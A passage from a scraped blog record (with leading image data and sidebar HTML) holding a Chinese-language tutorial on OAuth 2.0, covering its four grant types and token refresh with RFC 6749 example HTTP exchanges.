Kfq79Pf9AAbWBtwDNoMBgxJBk6GWYathiOGdGMfI3yjTqNnhtrGEcZ7zLuM/5oYmGSYtJoct9UxtTbNN+02/R3Mz0zllmN2S1zsrm7+QbzLvMXy/SXcZbtX3bHgmLhZ7HVosfig6WVJd+y1XLaSsMq1qrWaoRBZQQwShiXrdHWztYbrE9Zv7WxtBHYHLf5zdbQNtn2iO3Ucu3lnOWNy8ft1OyYdvV2o/Z0+1j7A/ajDqoOTIcGh8eO6o5sxybHSSddpySno07PnU2c+c7tzvMuNi7rXM65Iq4erkWuA24ybqFu1W6P3NXcE9xb3Gc9LDzWepzzRHv6eO7yHPFS8mJ5NXvNelt5r/Pu9SH5BPtU+zz21fPl+3b7wX7efrv9HqzQXMFb0ekP/L38d/s/DNAOWBPwYyAmMCCwJvBJkGlQXlBfMCU4JvhI8OsQ55DSkPuhOqHC0J4wybDosOaw+XDX8LLw0QjjiHUR1yIVIrmRXVHYqLCopqi5lW4r96yciLaILoweXqW9KnvVldUKq1NWn46RjGHGnIhFx4bHHol9z/RnNjDn4rziauNmWS6svaxnbEd2OXuaY8cp40zG28WXxU8l2CXsTphOdEisSJzhunCruS+SPJPqkuaT/ZMPJX9KCU9pS8Wlxqae5Mnwknm9acpp2WmD6frphemja2zW7Fkzy/fhN2VAGasyugRU0c9Uv1BHuEU4lmmfWZP5Jiss60S2dDYvuz9HL2d7zmSue+63a1FrWWt78lTzNuWNrXNaV78eWh+3vmeD+oaCDRMbPTYe3kTYlLzpp3yT/LL8V5vDN3cXKBVsLBjf4rGlpVCikF84stV2a9021DbutoHt5turtn8sYhddLTYprih+X8IqufqN6TeV33zaEb9joNSydP9OzE7ezuFdDrsOl0mX5ZaN7/bb3VFOLy8qf7UnZs+VimUVdXsJe4V7Ryt9K7uqNKp2Vr2vTqy+XeNc01arWLu9dn4fe9/Qfsf9rXVKdcV17w5wD9yp96jvaNBqqDiIOZh58EljWGPft4xvm5sUmoqbPhziHRo9HHS4t9mqufmI4pHSFrhF2DJ9NProje9cv+tqNWytb6O1FR8Dx4THnn4f+/3wcZ/jPScYJ1p/0Pyhtp3SXtQBdeR0zHYmdo52RXYNnvQ+2dNt293+o9GPh06pnqo5LXu69AzhTMGZT2dzz86dSz83cz7h/HhPTM/9CxEXbvUG9g5c9Ll4+ZL7pQt9Tn1nL9tdPnXF5srJq4yrndcsr3X0W/S3/2TxU/uA5UDHdavrXTesb3QPLh88M+QwdP6m681Lt7xuXbu94vbgcOjwnZHokdE77DtTd1PuvriXeW/h/sYH6AdFD6UeVjxSfNTws+7PbaOWo6fHXMf6Hwc/vj/OGn/2S8Yv7ycKnpCfVEyqTDZPmU2dmnafvvF05dOJZ+nPFmYKf5X+tfa5zvMffnP8rX82YnbiBf/Fp99LXsq/PPRq2aueuYC5R69TXy/MF72Rf3P4LeNt37vwd5MLWe+x7ys/6H7o/ujz8cGn1E+f/gUDmPP8kcBa2wAAADxQTFRFAAAAAAAAAgICBAQEBQUFBgYGBwcHCAgICQkJCgoKDQ0NExMTOTk5c3NzdXV1eHh4eXl5enp6e3t7fHx8rr9WJAAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYMADMaKH8BrQAAAGVJREFUGNONkI0KwCAIhE+32n/b2vu/6yqYCRnshMCPS/SA/6Ikk5vQWXQ7gpL6H1KV54OMbCiuCk0n9rOdma3i1JteuIGIJ1bI60Se2dG4qFWDddQsSeiZpRkILfQ6Hcmvk2NPLzksA4TnEeNNAAAAAElFTkSuQmCC" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-21 08:12:10', '2014-05-12 13:07:52', 0, '[["\\u5ba2\\u6237\\u7aef", 0.48351105158587276], ["\\u4ee4\\u724c", 0.25843465984588443], ["\\u670d\\u52a1\\u5668", 0.20879017438711037], ["\\u6388\\u6743", 0.20200775127021015], ["token", 0.19540775836614127], ["\\u8ba4\\u8bc1", 0.16912231765730298], ["\\u7528\\u6237", 0.16727268829050787], ["HTTP", 0.14655581877460594], ["example", 0.12561927323537653], ["type", 0.11864042472230006], ["\\u6b65\\u9aa4", 0.10340324762677174], ["\\u9009\\u9879", 0.09121690201079392], ["URI", 0.09072503066999416], ["\\u51b2\\u5370", 0.08926296215528312], ["\\u53c2\\u6570", 0.08575213770511383], ["\\u6a21\\u5f0f", 0.08449053177597199], ["\\u8868\\u793a", 0.0776703833230823], ["\\u5bc6\\u7801", 0.07723518255505546], ["OAuth", 0.07676733364384121], ["1.1", 0.07676733364384121]]', NULL, NULL, 'OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。 本文对OAuth 2.0的设计思路和运行流程，做一个简明通俗的解释，主要参考材料为RFC 6749。 一、应用场景 为了理解OAuth的适用场合，让我举一个假设的例子。 有一个"云冲印"的网站，可以将用户储存在Google的照片，冲印出来。用户为了使用该服务，必须让"云冲印"读取自己储存在Google上的照片。 问题是只有得到用户的授权，Google才会同意"云冲印"读取这些照片。那么，"云冲印"怎样获得用户的授权呢？ 传统方法是，用户将自己的Google用户名和密码，告诉"云冲印"，后者就可以读取用户的照片了。这样的做法有以下几个严重的缺点。 （1）"云冲印"为了后续的服务，会保存用户的密码，这样很不安全。 （2）Google不得不部署密码登录，而我们知道，单纯的密码登录并不安全。 （3）"云冲印"拥有了获取用户储存在Google所有资料的权力，用户没法限制"云冲印"获得授权的范围和有效期。 （4）用户只有修改密码，才能收回赋予"云冲印"的权力。但是这样做，会使得其他所有获得用户授权的第三方应用程序全部失效。 （5）只要有一个第三方应用程序被破解，就会导致用户密码泄漏，以及所有被密码保护的数据泄漏。 OAuth就是为了解决上面这些问题而诞生的。 二、名词定义 在详细讲解OAuth 2.0之前，需要了解几个专用名词。它们对读懂后面的讲解，尤其是几张图，至关重要。 （1） Third-party application：第三方应用程序，本文中又称"客户端"（client），即上一节例子中的"云冲印"。 （2）HTTP service：HTTP服务提供商，本文中简称"服务提供商"，即上一节例子中的Google。 （3）Resource Owner：资源所有者，本文中又称"用户"（user）。 （4）User Agent：用户代理，本文中就是指浏览器。 （5）Authorization server：认证服务器，即服务提供商专门用来处理认证的服务器。 （6）Resource server：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。 知道了上面这些名词，就不难理解，OAuth的作用就是让"客户端"安全可控地获取"用户"的授权，与"服务商提供商"进行互动。 三、OAuth的思路 OAuth在"客户端"与"服务提供商"之间，设置了一个授权层（authorization layer）。"客户端"不能直接登录"服务提供商"，只能登录授权层，以此将用户与客户端区分开来。"客户端"登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。 "客户端"登录授权层以后，"服务提供商"根据令牌的权限范围和有效期，向"客户端"开放用户储存的资料。 四、运行流程 OAuth 2.0的运行流程如下图，摘自RFC 6749。 （A）用户打开客户端以后，客户端要求用户给予授权。 （B）用户同意给予客户端授权。 （C）客户端使用上一步获得的授权，向认证服务器申请令牌。 （D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。 （E）客户端使用令牌，向资源服务器申请获取资源。 （F）资源服务器确认令牌无误，同意向客户端开放资源。 不难看出来，上面六个步骤之中，B是关键，即用户怎样才能给于客户端授权。有了这个授权以后，客户端就可以获取令牌，进而凭令牌获取资源。 下面一一讲解客户端获取授权的四种模式。 五、客户端的授权模式 客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式。 授权码模式（authorization code） 简化模式（implicit） 密码模式（resource owner password credentials） 客户端模式（client credentials） 六、授权码模式 授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与"服务提供商"的认证服务器进行互动。 它的步骤如下： （A）用户访问客户端，后者将前者导向认证服务器。 （B）用户选择是否给予客户端授权。 （C）假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI），同时附上一个授权码。 （D）客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。 （E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。 下面是上面这些步骤所需要的参数。 A步骤中，客户端申请认证的URI，包含以下参数： response_type：表示授权类型，必选项，此处的值固定为"code" client_id：表示客户端的ID，必选项 redirect_uri：表示重定向URI，可选项 scope：表示申请的权限范围，可选项 state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。 下面是一个例子。 GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1 Host: server.example.com C步骤中，服务器回应客户端的URI，包含以下参数： code：表示授权码，必选项。该码的有效期应该很短，通常设为10分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系。 state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。 下面是一个例子。 HTTP/1.1 302 Found Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA &state=xyz D步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数： grant_type：表示使用的授权模式，必选项，此处的值固定为"authorization_code"。 code：表示上一步获得的授权码，必选项。 redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。 client_id：表示客户端ID，必选项。 下面是一个例子。 POST /token HTTP/1.1 Host: server.example.com Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW Content-Type: application/x-www-form-urlencoded grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb E步骤中，认证服务器发送的HTTP回复，包含以下参数： access_token：表示访问令牌，必选项。 token_type：表示令牌类型，该值大小写不敏感，必选项，可以是bearer类型或mac类型。 expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。 refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。 scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。 下面是一个例子。 HTTP/1.1 200 OK Content-Type: application/json;charset=UTF-8 Cache-Control: no-store Pragma: no-cache { "access_token":"2YotnFZFEjr1zCsicMWpAA", "token_type":"example", "expires_in":3600, "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA", "example_parameter":"example_value" } 从上面代码可以看到，相关参数使用JSON格式发送（Content-Type: application/json）。此外，HTTP头信息中明确指定不得缓存。 七、简化模式 简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了"授权码"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。 它的步骤如下： （A）客户端将用户导向认证服务器。 （B）用户决定是否给于客户端授权。 （C）假设用户给予授权，认证服务器将用户导向客户端指定的"重定向URI"，并在URI的Hash部分包含了访问令牌。 （D）浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值。 （E）资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌。 （F）浏览器执行上一步获得的脚本，提取出令牌。 （G）浏览器将令牌发给客户端。 下面是上面这些步骤所需要的参数。 A步骤中，客户端发出的HTTP请求，包含以下参数： response_type：表示授权类型，此处的值固定为"token"，必选项。 client_id：表示客户端的ID，必选项。 redirect_uri：表示重定向的URI，可选项。 scope：表示权限范围，可选项。 state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。 下面是一个例子。 GET /authorize?response_type=token&client_id=s6BhdRkqt3&state=xyz &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1 Host: server.example.com C步骤中，认证服务器回应客户端的URI，包含以下参数： access_token：表示访问令牌，必选项。 token_type：表示令牌类型，该值大小写不敏感，必选项。 expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。 scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。 state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。 下面是一个例子。 HTTP/1.1 302 Found Location: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA &state=xyz&token_type=example&expires_in=3600 在上面的例子中，认证服务器用HTTP头信息的Location栏，指定浏览器重定向的网址。注意，在这个网址的Hash部分包含了令牌。 根据上面的D步骤，下一步浏览器会访问Location指定的网址，但是Hash部分不会发送。接下来的E步骤，服务提供商的资源服务器发送过来的代码，会提取出Hash中的令牌。 八、密码模式 密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向"服务商提供商"索要授权。 在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。 它的步骤如下： （A）用户向客户端提供用户名和密码。 （B）客户端将用户名和密码发给认证服务器，向后者请求令牌。 （C）认证服务器确认无误后，向客户端提供访问令牌。 B步骤中，客户端发出的HTTP请求，包含以下参数： grant_type：表示授权类型，此处的值固定为"password"，必选项。 username：表示用户名，必选项。 password：表示用户的密码，必选项。 scope：表示权限范围，可选项。 下面是一个例子。 POST /token HTTP/1.1 Host: server.example.com Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW Content-Type: application/x-www-form-urlencoded grant_type=password&username=johndoe&password=A3ddj3w C步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。 HTTP/1.1 200 OK Content-Type: application/json;charset=UTF-8 Cache-Control: no-store Pragma: no-cache { "access_token":"2YotnFZFEjr1zCsicMWpAA", "token_type":"example", "expires_in":3600, "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA", "example_parameter":"example_value" } 上面代码中，各个参数的含义参见《授权码模式》一节。 整个过程中，客户端不得保存用户的密码。 九、客户端模式 客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向"服务提供商"进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求"服务提供商"提供服务，其实不存在授权问题。 它的步骤如下： （A）客户端向认证服务器进行身份认证，并要求一个访问令牌。 （B）认证服务器确认无误后，向客户端提供访问令牌。 A步骤中，客户端发出的HTTP请求，包含以下参数： granttype：表示授权类型，此处的值固定为"clientcredentials"，必选项。 scope：表示权限范围，可选项。 POST /token HTTP/1.1 Host: server.example.com Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW Content-Type: application/x-www-form-urlencoded grant_type=client_credentials 认证服务器必须以某种方式，验证客户端身份。 B步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。 HTTP/1.1 200 OK Content-Type: application/json;charset=UTF-8 Cache-Control: no-store Pragma: no-cache { "access_token":"2YotnFZFEjr1zCsicMWpAA", "token_type":"example", "expires_in":3600, "example_parameter":"example_value" } 上面代码中，各个参数的含义参见《授权码模式》一节。 十、更新令牌 如果用户访问的时候，客户端的"访问令牌"已经过期，则需要使用"更新令牌"申请一个新的访问令牌。 客户端发出更新令牌的HTTP请求，包含以下参数： granttype：表示使用的授权模式，此处的值固定为"refreshtoken"，必选项。 refresh_token：表示早前收到的更新令牌，必选项。 scope：表示申请的授权范围，不可以超出上一次申请的范围，如果省略该参数，则表示与上一次一致。 下面是一个例子。 POST /token HTTP/1.1 Host: server.example.com Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW Content-Type: application/x-www-form-urlencoded grant_type=refresh_token&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA （完） 文档信息 